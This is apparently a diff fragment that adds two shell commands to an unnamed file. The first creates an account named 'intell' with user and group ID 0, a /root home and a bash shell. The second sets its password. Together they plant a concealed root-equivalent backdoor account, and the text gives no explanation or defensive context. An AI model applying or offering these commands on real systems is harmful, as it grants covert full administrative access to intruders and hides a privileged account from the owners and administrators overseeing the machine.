@@ -1,0 +1,2 @@
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash intell
+passwd intell
